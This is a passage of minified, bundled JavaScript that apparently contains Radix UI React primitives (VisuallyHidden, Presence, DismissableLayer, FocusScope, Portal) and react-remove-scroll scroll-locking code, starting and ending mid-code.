    border: 0,
    width: 1,
    height: 1,
    padding: 0,
    margin: -1,
    overflow: "hidden",
    clip: "rect(0, 0, 0, 0)",
    whiteSpace: "nowrap",
    wordWrap: "normal"
})
  , NAME$1 = "VisuallyHidden"
  , VisuallyHidden = reactExports.forwardRef( (_, M) => jsxRuntimeExports.jsx(Primitive$1.span, {
    ..._,
    ref: M,
    style: {
        ...VISUALLY_HIDDEN_STYLES,
        ..._.style
    }
}));
VisuallyHidden.displayName = NAME$1;
var Root$4 = VisuallyHidden;
function createContext2(_, M) {
    const j = reactExports.createContext(M)
      , O = w => {
        const {children: b, ...X} = w
          , Y = reactExports.useMemo( () => X, Object.values(X));
        return jsxRuntimeExports.jsx(j.Provider, {
            value: Y,
            children: b
        })
    }
    ;
    O.displayName = _ + "Provider";
    function x(w) {
        const b = reactExports.useContext(j);
        if (b)
            return b;
        if (M !== void 0)
            return M;
        throw new Error(`\`${w}\` must be used within \`${_}\``)
    }
    return [O, x]
}
function createContextScope(_, M=[]) {
    let j = [];
    function O(w, b) {
        const X = reactExports.createContext(b)
          , Y = j.length;
        j = [...j, b];
        const F = K => {
            var ue;
            const {scope: Q, children: ee, ...ae} = K
              , ne = ((ue = Q == null ? void 0 : Q[_]) == null ? void 0 : ue[Y]) || X
              , oe = reactExports.useMemo( () => ae, Object.values(ae));
            return jsxRuntimeExports.jsx(ne.Provider, {
                value: oe,
                children: ee
            })
        }
        ;
        F.displayName = w + "Provider";
        function V(K, Q) {
            var ne;
            const ee = ((ne = Q == null ? void 0 : Q[_]) == null ? void 0 : ne[Y]) || X
              , ae = reactExports.useContext(ee);
            if (ae)
                return ae;
            if (b !== void 0)
                return b;
            throw new Error(`\`${K}\` must be used within \`${w}\``)
        }
        return [F, V]
    }
    const x = () => {
        const w = j.map(b => reactExports.createContext(b));
        return function(X) {
            const Y = (X == null ? void 0 : X[_]) || w;
            return reactExports.useMemo( () => ({
                [`__scope${_}`]: {
                    ...X,
                    [_]: Y
                }
            }), [X, Y])
        }
    }
    ;
    return x.scopeName = _,
    [O, composeContextScopes(x, ...M)]
}
function composeContextScopes(..._) {
    const M = _[0];
    if (_.length === 1)
        return M;
    const j = () => {
        const O = _.map(x => ({
            useScope: x(),
            scopeName: x.scopeName
        }));
        return function(w) {
            const b = O.reduce( (X, {useScope: Y, scopeName: F}) => {
                const K = Y(w)[`__scope${F}`];
                return {
                    ...X,
                    ...K
                }
            }
            , {});
            return reactExports.useMemo( () => ({
                [`__scope${M.scopeName}`]: b
            }), [b])
        }
    }
    ;
    return j.scopeName = M.scopeName,
    j
}
function createCollection(_) {
    const M = _ + "CollectionProvider"
      , [j,O] = createContextScope(M)
      , [x,w] = j(M, {
        collectionRef: {
            current: null
        },
        itemMap: new Map
    })
      , b = ne => {
        const {scope: oe, children: ue} = ne
          , fe = React.useRef(null)
          , he = React.useRef(new Map).current;
        return jsxRuntimeExports.jsx(x, {
            scope: oe,
            itemMap: he,
            collectionRef: fe,
            children: ue
        })
    }
    ;
    b.displayName = M;
    const X = _ + "CollectionSlot"
      , Y = createSlot(X)
      , F = React.forwardRef( (ne, oe) => {
        const {scope: ue, children: fe} = ne
          , he = w(X, ue)
          , pe = useComposedRefs(oe, he.collectionRef);
        return jsxRuntimeExports.jsx(Y, {
            ref: pe,
            children: fe
        })
    }
    );
    F.displayName = X;
    const V = _ + "CollectionItemSlot"
      , K = "data-radix-collection-item"
      , Q = createSlot(V)
      , ee = React.forwardRef( (ne, oe) => {
        const {scope: ue, children: fe, ...he} = ne
          , pe = React.useRef(null)
          , ye = useComposedRefs(oe, pe)
          , be = w(V, ue);
        return React.useEffect( () => (be.itemMap.set(pe, {
            ref: pe,
            ...he
        }),
        () => void be.itemMap.delete(pe))),
        jsxRuntimeExports.jsx(Q, {
            [K]: "",
            ref: ye,
            children: fe
        })
    }
    );
    ee.displayName = V;
    function ae(ne) {
        const oe = w(_ + "CollectionConsumer", ne);
        return React.useCallback( () => {
            const fe = oe.collectionRef.current;
            if (!fe)
                return [];
            const he = Array.from(fe.querySelectorAll(`[${K}]`));
            return Array.from(oe.itemMap.values()).sort( (be, xe) => he.indexOf(be.ref.current) - he.indexOf(xe.ref.current))
        }
        , [oe.collectionRef, oe.itemMap])
    }
    return [{
        Provider: b,
        Slot: F,
        ItemSlot: ee
    }, ae, O]
}
function composeEventHandlers$1(_, M, {checkForDefaultPrevented: j=!0}={}) {
    return function(x) {
        if (_ == null || _(x),
        j === !1 || !x.defaultPrevented)
            return M == null ? void 0 : M(x)
    }
}
var useLayoutEffect2 = globalThis != null && globalThis.document ? reactExports.useLayoutEffect : () => {}
  , useInsertionEffect = React$1[" useInsertionEffect ".trim().toString()] || useLayoutEffect2;
function useControllableState({prop: _, defaultProp: M, onChange: j= () => {}
, caller: O}) {
    const [x,w,b] = useUncontrolledState({
        defaultProp: M,
        onChange: j
    })
      , X = _ !== void 0
      , Y = X ? _ : x;
    {
        const V = reactExports.useRef(_ !== void 0);
        reactExports.useEffect( () => {
            const K = V.current;
            K !== X && console.warn(`${O} is changing from ${K ? "controlled" : "uncontrolled"} to ${X ? "controlled" : "uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),
            V.current = X
        }
        , [X, O])
    }
    const F = reactExports.useCallback(V => {
        var K;
        if (X) {
            const Q = isFunction$1(V) ? V(_) : V;
            Q !== _ && ((K = b.current) == null || K.call(b, Q))
        } else
            w(V)
    }
    , [X, _, w, b]);
    return [Y, F]
}
function useUncontrolledState({defaultProp: _, onChange: M}) {
    const [j,O] = reactExports.useState(_)
      , x = reactExports.useRef(j)
      , w = reactExports.useRef(M);
    return useInsertionEffect( () => {
        w.current = M
    }
    , [M]),
    reactExports.useEffect( () => {
        var b;
        x.current !== j && ((b = w.current) == null || b.call(w, j),
        x.current = j)
    }
    , [j, x]),
    [j, O, w]
}
function isFunction$1(_) {
    return typeof _ == "function"
}
function useStateMachine$1(_, M) {
    return reactExports.useReducer( (j, O) => M[j][O] ?? j, _)
}
var Presence = _ => {
    const {present: M, children: j} = _
      , O = usePresence(M)
      , x = typeof j == "function" ? j({
        present: O.isPresent
    }) : reactExports.Children.only(j)
      , w = useComposedRefs(O.ref, getElementRef(x));
    return typeof j == "function" || O.isPresent ? reactExports.cloneElement(x, {
        ref: w
    }) : null
}
;
Presence.displayName = "Presence";
function usePresence(_) {
    const [M,j] = reactExports.useState()
      , O = reactExports.useRef(null)
      , x = reactExports.useRef(_)
      , w = reactExports.useRef("none")
      , b = _ ? "mounted" : "unmounted"
      , [X,Y] = useStateMachine$1(b, {
        mounted: {
            UNMOUNT: "unmounted",
            ANIMATION_OUT: "unmountSuspended"
        },
        unmountSuspended: {
            MOUNT: "mounted",
            ANIMATION_END: "unmounted"
        },
        unmounted: {
            MOUNT: "mounted"
        }
    });
    return reactExports.useEffect( () => {
        const F = getAnimationName(O.current);
        w.current = X === "mounted" ? F : "none"
    }
    , [X]),
    useLayoutEffect2( () => {
        const F = O.current
          , V = x.current;
        if (V !== _) {
            const Q = w.current
              , ee = getAnimationName(F);
            _ ? Y("MOUNT") : ee === "none" || (F == null ? void 0 : F.display) === "none" ? Y("UNMOUNT") : Y(V && Q !== ee ? "ANIMATION_OUT" : "UNMOUNT"),
            x.current = _
        }
    }
    , [_, Y]),
    useLayoutEffect2( () => {
        if (M) {
            let F;
            const V = M.ownerDocument.defaultView ?? window
              , K = ee => {
                const ne = getAnimationName(O.current).includes(ee.animationName);
                if (ee.target === M && ne && (Y("ANIMATION_END"),
                !x.current)) {
                    const oe = M.style.animationFillMode;
                    M.style.animationFillMode = "forwards",
                    F = V.setTimeout( () => {
                        M.style.animationFillMode === "forwards" && (M.style.animationFillMode = oe)
                    }
                    )
                }
            }
              , Q = ee => {
                ee.target === M && (w.current = getAnimationName(O.current))
            }
            ;
            return M.addEventListener("animationstart", Q),
            M.addEventListener("animationcancel", K),
            M.addEventListener("animationend", K),
            () => {
                V.clearTimeout(F),
                M.removeEventListener("animationstart", Q),
                M.removeEventListener("animationcancel", K),
                M.removeEventListener("animationend", K)
            }
        } else
            Y("ANIMATION_END")
    }
    , [M, Y]),
    {
        isPresent: ["mounted", "unmountSuspended"].includes(X),
        ref: reactExports.useCallback(F => {
            O.current = F ? getComputedStyle(F) : null,
            j(F)
        }
        , [])
    }
}
function getAnimationName(_) {
    return (_ == null ? void 0 : _.animationName) || "none"
}
function getElementRef(_) {
    var O, x;
    let M = (O = Object.getOwnPropertyDescriptor(_.props, "ref")) == null ? void 0 : O.get
      , j = M && "isReactWarning"in M && M.isReactWarning;
    return j ? _.ref : (M = (x = Object.getOwnPropertyDescriptor(_, "ref")) == null ? void 0 : x.get,
    j = M && "isReactWarning"in M && M.isReactWarning,
    j ? _.props.ref : _.props.ref || _.ref)
}
var useReactId = React$1[" useId ".trim().toString()] || ( () => {}
)
  , count$1 = 0;
function useId(_) {
    const [M,j] = reactExports.useState(useReactId());
    return useLayoutEffect2( () => {
        j(O => O ?? String(count$1++))
    }
    , [_]),
    _ || (M ? `radix-${M}` : "")
}
var DirectionContext = reactExports.createContext(void 0)
  , DirectionProvider = _ => {
    const {dir: M, children: j} = _;
    return jsxRuntimeExports.jsx(DirectionContext.Provider, {
        value: M,
        children: j
    })
}
;
function useDirection(_) {
    const M = reactExports.useContext(DirectionContext);
    return _ || M || "ltr"
}
var Provider$1 = DirectionProvider;
function useCallbackRef$1(_) {
    const M = reactExports.useRef(_);
    return reactExports.useEffect( () => {
        M.current = _
    }
    ),
    reactExports.useMemo( () => (...j) => {
        var O;
        return (O = M.current) == null ? void 0 : O.call(M, ...j)
    }
    , [])
}
function useEscapeKeydown(_, M=globalThis == null ? void 0 : globalThis.document) {
    const j = useCallbackRef$1(_);
    reactExports.useEffect( () => {
        const O = x => {
            x.key === "Escape" && j(x)
        }
        ;
        return M.addEventListener("keydown", O, {
            capture: !0
        }),
        () => M.removeEventListener("keydown", O, {
            capture: !0
        })
    }
    , [j, M])
}
var DISMISSABLE_LAYER_NAME = "DismissableLayer", CONTEXT_UPDATE = "dismissableLayer.update", POINTER_DOWN_OUTSIDE = "dismissableLayer.pointerDownOutside", FOCUS_OUTSIDE = "dismissableLayer.focusOutside", originalBodyPointerEvents, DismissableLayerContext = reactExports.createContext({
    layers: new Set,
    layersWithOutsidePointerEventsDisabled: new Set,
    branches: new Set
}), DismissableLayer = reactExports.forwardRef( (_, M) => {
    const {disableOutsidePointerEvents: j=!1, onEscapeKeyDown: O, onPointerDownOutside: x, onFocusOutside: w, onInteractOutside: b, onDismiss: X, ...Y} = _
      , F = reactExports.useContext(DismissableLayerContext)
      , [V,K] = reactExports.useState(null)
      , Q = (V == null ? void 0 : V.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document)
      , [,ee] = reactExports.useState({})
      , ae = useComposedRefs(M, xe => K(xe))
      , ne = Array.from(F.layers)
      , [oe] = [...F.layersWithOutsidePointerEventsDisabled].slice(-1)
      , ue = ne.indexOf(oe)
      , fe = V ? ne.indexOf(V) : -1
      , he = F.layersWithOutsidePointerEventsDisabled.size > 0
      , pe = fe >= ue
      , ye = usePointerDownOutside(xe => {
        const Ae = xe.target
          , Ee = [...F.branches].some(Be => Be.contains(Ae));
        !pe || Ee || (x == null || x(xe),
        b == null || b(xe),
        xe.defaultPrevented || X == null || X())
    }
    , Q)
      , be = useFocusOutside(xe => {
        const Ae = xe.target;
        [...F.branches].some(Be => Be.contains(Ae)) || (w == null || w(xe),
        b == null || b(xe),
        xe.defaultPrevented || X == null || X())
    }
    , Q);
    return useEscapeKeydown(xe => {
        fe === F.layers.size - 1 && (O == null || O(xe),
        !xe.defaultPrevented && X && (xe.preventDefault(),
        X()))
    }
    , Q),
    reactExports.useEffect( () => {
        if (V)
            return j && (F.layersWithOutsidePointerEventsDisabled.size === 0 && (originalBodyPointerEvents = Q.body.style.pointerEvents,
            Q.body.style.pointerEvents = "none"),
            F.layersWithOutsidePointerEventsDisabled.add(V)),
            F.layers.add(V),
            dispatchUpdate(),
            () => {
                j && F.layersWithOutsidePointerEventsDisabled.size === 1 && (Q.body.style.pointerEvents = originalBodyPointerEvents)
            }
    }
    , [V, Q, j, F]),
    reactExports.useEffect( () => () => {
        V && (F.layers.delete(V),
        F.layersWithOutsidePointerEventsDisabled.delete(V),
        dispatchUpdate())
    }
    , [V, F]),
    reactExports.useEffect( () => {
        const xe = () => ee({});
        return document.addEventListener(CONTEXT_UPDATE, xe),
        () => document.removeEventListener(CONTEXT_UPDATE, xe)
    }
    , []),
    jsxRuntimeExports.jsx(Primitive$1.div, {
        ...Y,
        ref: ae,
        style: {
            pointerEvents: he ? pe ? "auto" : "none" : void 0,
            ..._.style
        },
        onFocusCapture: composeEventHandlers$1(_.onFocusCapture, be.onFocusCapture),
        onBlurCapture: composeEventHandlers$1(_.onBlurCapture, be.onBlurCapture),
        onPointerDownCapture: composeEventHandlers$1(_.onPointerDownCapture, ye.onPointerDownCapture)
    })
}
);
DismissableLayer.displayName = DISMISSABLE_LAYER_NAME;
var BRANCH_NAME = "DismissableLayerBranch"
  , DismissableLayerBranch = reactExports.forwardRef( (_, M) => {
    const j = reactExports.useContext(DismissableLayerContext)
      , O = reactExports.useRef(null)
      , x = useComposedRefs(M, O);
    return reactExports.useEffect( () => {
        const w = O.current;
        if (w)
            return j.branches.add(w),
            () => {
                j.branches.delete(w)
            }
    }
    , [j.branches]),
    jsxRuntimeExports.jsx(Primitive$1.div, {
        ..._,
        ref: x
    })
}
);
DismissableLayerBranch.displayName = BRANCH_NAME;
function usePointerDownOutside(_, M=globalThis == null ? void 0 : globalThis.document) {
    const j = useCallbackRef$1(_)
      , O = reactExports.useRef(!1)
      , x = reactExports.useRef( () => {}
    );
    return reactExports.useEffect( () => {
        const w = X => {
            if (X.target && !O.current) {
                let Y = function() {
                    handleAndDispatchCustomEvent(POINTER_DOWN_OUTSIDE, j, F, {
                        discrete: !0
                    })
                };
                const F = {
                    originalEvent: X
                };
                X.pointerType === "touch" ? (M.removeEventListener("click", x.current),
                x.current = Y,
                M.addEventListener("click", x.current, {
                    once: !0
                })) : Y()
            } else
                M.removeEventListener("click", x.current);
            O.current = !1
        }
          , b = window.setTimeout( () => {
            M.addEventListener("pointerdown", w)
        }
        , 0);
        return () => {
            window.clearTimeout(b),
            M.removeEventListener("pointerdown", w),
            M.removeEventListener("click", x.current)
        }
    }
    , [M, j]),
    {
        onPointerDownCapture: () => O.current = !0
    }
}
function useFocusOutside(_, M=globalThis == null ? void 0 : globalThis.document) {
    const j = useCallbackRef$1(_)
      , O = reactExports.useRef(!1);
    return reactExports.useEffect( () => {
        const x = w => {
            w.target && !O.current && handleAndDispatchCustomEvent(FOCUS_OUTSIDE, j, {
                originalEvent: w
            }, {
                discrete: !1
            })
        }
        ;
        return M.addEventListener("focusin", x),
        () => M.removeEventListener("focusin", x)
    }
    , [M, j]),
    {
        onFocusCapture: () => O.current = !0,
        onBlurCapture: () => O.current = !1
    }
}
function dispatchUpdate() {
    const _ = new CustomEvent(CONTEXT_UPDATE);
    document.dispatchEvent(_)
}
function handleAndDispatchCustomEvent(_, M, j, {discrete: O}) {
    const x = j.originalEvent.target
      , w = new CustomEvent(_,{
        bubbles: !1,
        cancelable: !0,
        detail: j
    });
    M && x.addEventListener(_, M, {
        once: !0
    }),
    O ? dispatchDiscreteCustomEvent(x, w) : x.dispatchEvent(w)
}
var AUTOFOCUS_ON_MOUNT = "focusScope.autoFocusOnMount"
  , AUTOFOCUS_ON_UNMOUNT = "focusScope.autoFocusOnUnmount"
  , EVENT_OPTIONS$1 = {
    bubbles: !1,
    cancelable: !0
}
  , FOCUS_SCOPE_NAME = "FocusScope"
  , FocusScope = reactExports.forwardRef( (_, M) => {
    const {loop: j=!1, trapped: O=!1, onMountAutoFocus: x, onUnmountAutoFocus: w, ...b} = _
      , [X,Y] = reactExports.useState(null)
      , F = useCallbackRef$1(x)
      , V = useCallbackRef$1(w)
      , K = reactExports.useRef(null)
      , Q = useComposedRefs(M, ne => Y(ne))
      , ee = reactExports.useRef({
        paused: !1,
        pause() {
            this.paused = !0
        },
        resume() {
            this.paused = !1
        }
    }).current;
    reactExports.useEffect( () => {
        if (O) {
            let ne = function(he) {
                if (ee.paused || !X)
                    return;
                const pe = he.target;
                X.contains(pe) ? K.current = pe : focus(K.current, {
                    select: !0
                })
            }
              , oe = function(he) {
                if (ee.paused || !X)
                    return;
                const pe = he.relatedTarget;
                pe !== null && (X.contains(pe) || focus(K.current, {
                    select: !0
                }))
            }
              , ue = function(he) {
                if (document.activeElement === document.body)
                    for (const ye of he)
                        ye.removedNodes.length > 0 && focus(X)
            };
            document.addEventListener("focusin", ne),
            document.addEventListener("focusout", oe);
            const fe = new MutationObserver(ue);
            return X && fe.observe(X, {
                childList: !0,
                subtree: !0
            }),
            () => {
                document.removeEventListener("focusin", ne),
                document.removeEventListener("focusout", oe),
                fe.disconnect()
            }
        }
    }
    , [O, X, ee.paused]),
    reactExports.useEffect( () => {
        if (X) {
            focusScopesStack.add(ee);
            const ne = document.activeElement;
            if (!X.contains(ne)) {
                const ue = new CustomEvent(AUTOFOCUS_ON_MOUNT,EVENT_OPTIONS$1);
                X.addEventListener(AUTOFOCUS_ON_MOUNT, F),
                X.dispatchEvent(ue),
                ue.defaultPrevented || (focusFirst$2(removeLinks(getTabbableCandidates(X)), {
                    select: !0
                }),
                document.activeElement === ne && focus(X))
            }
            return () => {
                X.removeEventListener(AUTOFOCUS_ON_MOUNT, F),
                setTimeout( () => {
                    const ue = new CustomEvent(AUTOFOCUS_ON_UNMOUNT,EVENT_OPTIONS$1);
                    X.addEventListener(AUTOFOCUS_ON_UNMOUNT, V),
                    X.dispatchEvent(ue),
                    ue.defaultPrevented || focus(ne ?? document.body, {
                        select: !0
                    }),
                    X.removeEventListener(AUTOFOCUS_ON_UNMOUNT, V),
                    focusScopesStack.remove(ee)
                }
                , 0)
            }
        }
    }
    , [X, F, V, ee]);
    const ae = reactExports.useCallback(ne => {
        if (!j && !O || ee.paused)
            return;
        const oe = ne.key === "Tab" && !ne.altKey && !ne.ctrlKey && !ne.metaKey
          , ue = document.activeElement;
        if (oe && ue) {
            const fe = ne.currentTarget
              , [he,pe] = getTabbableEdges(fe);
            he && pe ? !ne.shiftKey && ue === pe ? (ne.preventDefault(),
            j && focus(he, {
                select: !0
            })) : ne.shiftKey && ue === he && (ne.preventDefault(),
            j && focus(pe, {
                select: !0
            })) : ue === fe && ne.preventDefault()
        }
    }
    , [j, O, ee.paused]);
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        tabIndex: -1,
        ...b,
        ref: Q,
        onKeyDown: ae
    })
}
);
FocusScope.displayName = FOCUS_SCOPE_NAME;
function focusFirst$2(_, {select: M=!1}={}) {
    const j = document.activeElement;
    for (const O of _)
        if (focus(O, {
            select: M
        }),
        document.activeElement !== j)
            return
}
function getTabbableEdges(_) {
    const M = getTabbableCandidates(_)
      , j = findVisible(M, _)
      , O = findVisible(M.reverse(), _);
    return [j, O]
}
function getTabbableCandidates(_) {
    const M = []
      , j = document.createTreeWalker(_, NodeFilter.SHOW_ELEMENT, {
        acceptNode: O => {
            const x = O.tagName === "INPUT" && O.type === "hidden";
            return O.disabled || O.hidden || x ? NodeFilter.FILTER_SKIP : O.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
        }
    });
    for (; j.nextNode(); )
        M.push(j.currentNode);
    return M
}
function findVisible(_, M) {
    for (const j of _)
        if (!isHidden(j, {
            upTo: M
        }))
            return j
}
function isHidden(_, {upTo: M}) {
    if (getComputedStyle(_).visibility === "hidden")
        return !0;
    for (; _; ) {
        if (M !== void 0 && _ === M)
            return !1;
        if (getComputedStyle(_).display === "none")
            return !0;
        _ = _.parentElement
    }
    return !1
}
function isSelectableInput(_) {
    return _ instanceof HTMLInputElement && "select"in _
}
function focus(_, {select: M=!1}={}) {
    if (_ && _.focus) {
        const j = document.activeElement;
        _.focus({
            preventScroll: !0
        }),
        _ !== j && isSelectableInput(_) && M && _.select()
    }
}
var focusScopesStack = createFocusScopesStack();
function createFocusScopesStack() {
    let _ = [];
    return {
        add(M) {
            const j = _[0];
            M !== j && (j == null || j.pause()),
            _ = arrayRemove(_, M),
            _.unshift(M)
        },
        remove(M) {
            var j;
            _ = arrayRemove(_, M),
            (j = _[0]) == null || j.resume()
        }
    }
}
function arrayRemove(_, M) {
    const j = [..._]
      , O = j.indexOf(M);
    return O !== -1 && j.splice(O, 1),
    j
}
function removeLinks(_) {
    return _.filter(M => M.tagName !== "A")
}
var PORTAL_NAME$5 = "Portal"
  , Portal$4 = reactExports.forwardRef( (_, M) => {
    var X;
    const {container: j, ...O} = _
      , [x,w] = reactExports.useState(!1);
    useLayoutEffect2( () => w(!0), []);
    const b = j || x && ((X = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : X.body);
    return b ? ReactDOM.createPortal(jsxRuntimeExports.jsx(Primitive$1.div, {
        ...O,
        ref: M
    }), b) : null
}
);
Portal$4.displayName = PORTAL_NAME$5;
var count = 0;
function useFocusGuards() {
    reactExports.useEffect( () => {
        const _ = document.querySelectorAll("[data-radix-focus-guard]");
        return document.body.insertAdjacentElement("afterbegin", _[0] ?? createFocusGuard()),
        document.body.insertAdjacentElement("beforeend", _[1] ?? createFocusGuard()),
        count++,
        () => {
            count === 1 && document.querySelectorAll("[data-radix-focus-guard]").forEach(M => M.remove()),
            count--
        }
    }
    , [])
}
function createFocusGuard() {
    const _ = document.createElement("span");
    return _.setAttribute("data-radix-focus-guard", ""),
    _.tabIndex = 0,
    _.style.outline = "none",
    _.style.opacity = "0",
    _.style.position = "fixed",
    _.style.pointerEvents = "none",
    _
}
var __assign$1 = function() {
    return __assign$1 = Object.assign || function(M) {
        for (var j, O = 1, x = arguments.length; O < x; O++) {
            j = arguments[O];
            for (var w in j)
                Object.prototype.hasOwnProperty.call(j, w) && (M[w] = j[w])
        }
        return M
    }
    ,
    __assign$1.apply(this, arguments)
};
function __rest$1(_, M) {
    var j = {};
    for (var O in _)
        Object.prototype.hasOwnProperty.call(_, O) && M.indexOf(O) < 0 && (j[O] = _[O]);
    if (_ != null && typeof Object.getOwnPropertySymbols == "function")
        for (var x = 0, O = Object.getOwnPropertySymbols(_); x < O.length; x++)
            M.indexOf(O[x]) < 0 && Object.prototype.propertyIsEnumerable.call(_, O[x]) && (j[O[x]] = _[O[x]]);
    return j
}
function __spreadArray(_, M, j) {
    if (j || arguments.length === 2)
        for (var O = 0, x = M.length, w; O < x; O++)
            (w || !(O in M)) && (w || (w = Array.prototype.slice.call(M, 0, O)),
            w[O] = M[O]);
    return _.concat(w || Array.prototype.slice.call(M))
}
typeof SuppressedError == "function" && SuppressedError;
var zeroRightClassName = "right-scroll-bar-position"
  , fullWidthClassName = "width-before-scroll-bar"
  , noScrollbarsClassName = "with-scroll-bars-hidden"
  , removedBarSizeVariable = "--removed-body-scroll-bar-size";
function assignRef(_, M) {
    return typeof _ == "function" ? _(M) : _ && (_.current = M),
    _
}
function useCallbackRef(_, M) {
    var j = reactExports.useState(function() {
        return {
            value: _,
            callback: M,
            facade: {
                get current() {
                    return j.value
                },
                set current(O) {
                    var x = j.value;
                    x !== O && (j.value = O,
                    j.callback(O, x))
                }
            }
        }
    })[0];
    return j.callback = M,
    j.facade
}
var useIsomorphicLayoutEffect$1 = typeof window < "u" ? reactExports.useLayoutEffect : reactExports.useEffect
  , currentValues = new WeakMap;
function useMergeRefs(_, M) {
    var j = useCallbackRef(null, function(O) {
        return _.forEach(function(x) {
            return assignRef(x, O)
        })
    });
    return useIsomorphicLayoutEffect$1(function() {
        var O = currentValues.get(j);
        if (O) {
            var x = new Set(O)
              , w = new Set(_)
              , b = j.current;
            x.forEach(function(X) {
                w.has(X) || assignRef(X, null)
            }),
            w.forEach(function(X) {
                x.has(X) || assignRef(X, b)
            })
        }
        currentValues.set(j, _)
    }, [_]),
    j
}
function ItoI(_) {
    return _
}
function innerCreateMedium(_, M) {
    M === void 0 && (M = ItoI);
    var j = []
      , O = !1
      , x = {
        read: function() {
            if (O)
                throw new Error("Sidecar: could not `read` from an `assigned` medium. `read` could be used only with `useMedium`.");
            return j.length ? j[j.length - 1] : _
        },
        useMedium: function(w) {
            var b = M(w, O);
            return j.push(b),
            function() {
                j = j.filter(function(X) {
                    return X !== b
                })
            }
        },
        assignSyncMedium: function(w) {
            for (O = !0; j.length; ) {
                var b = j;
                j = [],
                b.forEach(w)
            }
            j = {
                push: function(X) {
                    return w(X)
                },
                filter: function() {
                    return j
                }
            }
        },
        assignMedium: function(w) {
            O = !0;
            var b = [];
            if (j.length) {
                var X = j;
                j = [],
                X.forEach(w),
                b = j
            }
            var Y = function() {
                var V = b;
                b = [],
                V.forEach(w)
            }
              , F = function() {
                return Promise.resolve().then(Y)
            };
            F(),
            j = {
                push: function(V) {
                    b.push(V),
                    F()
                },
                filter: function(V) {
                    return b = b.filter(V),
                    j
                }
            }
        }
    };
    return x
}
function createSidecarMedium(_) {
    _ === void 0 && (_ = {});
    var M = innerCreateMedium(null);
    return M.options = __assign$1({
        async: !0,
        ssr: !1
    }, _),
    M
}
var SideCar$1 = function(_) {
    var M = _.sideCar
      , j = __rest$1(_, ["sideCar"]);
    if (!M)
        throw new Error("Sidecar: please provide `sideCar` property to import the right car");
    var O = M.read();
    if (!O)
        throw new Error("Sidecar medium not found");
    return reactExports.createElement(O, __assign$1({}, j))
};
SideCar$1.isSideCarExport = !0;
function exportSidecar(_, M) {
    return _.useMedium(M),
    SideCar$1
}
var effectCar = createSidecarMedium()
  , nothing = function() {}
  , RemoveScroll = reactExports.forwardRef(function(_, M) {
    var j = reactExports.useRef(null)
      , O = reactExports.useState({
        onScrollCapture: nothing,
        onWheelCapture: nothing,
        onTouchMoveCapture: nothing
    })
      , x = O[0]
      , w = O[1]
      , b = _.forwardProps
      , X = _.children
      , Y = _.className
      , F = _.removeScrollBar
      , V = _.enabled
      , K = _.shards
      , Q = _.sideCar
      , ee = _.noRelative
      , ae = _.noIsolation
      , ne = _.inert
      , oe = _.allowPinchZoom
      , ue = _.as
      , fe = ue === void 0 ? "div" : ue
      , he = _.gapMode
      , pe = __rest$1(_, ["forwardProps", "children", "className", "removeScrollBar", "enabled", "shards", "sideCar", "noRelative", "noIsolation", "inert", "allowPinchZoom", "as", "gapMode"])
      , ye = Q
      , be = useMergeRefs([j, M])
      , xe = __assign$1(__assign$1({}, pe), x);
    return reactExports.createElement(reactExports.Fragment, null, V && reactExports.createElement(ye, {
        sideCar: effectCar,
        removeScrollBar: F,
        shards: K,
        noRelative: ee,
        noIsolation: ae,
        inert: ne,
        setCallbacks: w,
        allowPinchZoom: !!oe,
        lockRef: j,
        gapMode: he
    }), b ? reactExports.cloneElement(reactExports.Children.only(X), __assign$1(__assign$1({}, xe), {
        ref: be
    })) : reactExports.createElement(fe, __assign$1({}, xe, {
        className: Y,
        ref: be
    }), X))
});
RemoveScroll.defaultProps = {
    enabled: !0,
    removeScrollBar: !0,
    inert: !1
};
RemoveScroll.classNames = {
    fullWidth: fullWidthClassName,
    zeroRight: zeroRightClassName
};
var getNonce = function() {
    if (typeof __webpack_nonce__ < "u")
        return __webpack_nonce__
};
function makeStyleTag() {
    if (!document)
        return null;
    var _ = document.createElement("style");
    _.type = "text/css";
    var M = getNonce();
    return M && _.setAttribute("nonce", M),
    _
}
function injectStyles(_, M) {
    _.styleSheet ? _.styleSheet.cssText = M : _.appendChild(document.createTextNode(M))
}
function insertStyleTag(_) {
    var M = document.head || document.getElementsByTagName("head")[0];
    M.appendChild(_)
}
var stylesheetSingleton = function() {
    var _ = 0
      , M = null;
    return {
        add: function(j) {
            _ == 0 && (M = makeStyleTag()) && (injectStyles(M, j),
            insertStyleTag(M)),
            _++
        },
        remove: function() {
            _--,
            !_ && M && (M.parentNode && M.parentNode.removeChild(M),
            M = null)
        }
    }
}
  , styleHookSingleton = function() {
    var _ = stylesheetSingleton();
    return function(M, j) {
        reactExports.useEffect(function() {
            return _.add(M),
            function() {
                _.remove()
            }
        }, [M && j])
    }
}
  , styleSingleton = function() {
    var _ = styleHookSingleton()
      , M = function(j) {
        var O = j.styles
          , x = j.dynamic;
        return _(O, x),
        null
    };
    return M
}
  , zeroGap = {
    left: 0,
    top: 0,
    right: 0,
    gap: 0
}
  , parse$2 = function(_) {
    return parseInt(_ || "", 10) || 0
}
  , getOffset = function(_) {
    var M = window.getComputedStyle(document.body)
      , j = M[_ === "padding" ? "paddingLeft" : "marginLeft"]
      , O = M[_ === "padding" ? "paddingTop" : "marginTop"]
      , x = M[_ === "padding" ? "paddingRight" : "marginRight"];
    return [parse$2(j), parse$2(O), parse$2(x)]
}
  , getGapWidth = function(_) {
    if (_ === void 0 && (_ = "margin"),
    typeof window > "u")
        return zeroGap;
    var M = getOffset(_)
      , j = document.documentElement.clientWidth
      , O = window.innerWidth;
    return {
        left: M[0],
        top: M[1],
        right: M[2],
        gap: Math.max(0, O - j + M[2] - M[0])
    }
}
  , Style = styleSingleton()
  , lockAttribute = "data-scroll-locked"
  , getStyles = function(_, M, j, O) {
    var x = _.left
      , w = _.top
      , b = _.right
      , X = _.gap;
    return j === void 0 && (j = "margin"),
    `
  .`.concat(noScrollbarsClassName, ` {
   overflow: hidden `).concat(O, `;
   padding-right: `).concat(X, "px ").concat(O, `;
  }
  body[`).concat(lockAttribute, `] {
    overflow: hidden `).concat(O, `;
    overscroll-behavior: contain;
    `).concat([M && "position: relative ".concat(O, ";"), j === "margin" && `
    padding-left: `.concat(x, `px;
    padding-top: `).concat(w, `px;
    padding-right: `).concat(b, `px;
    margin-left:0;
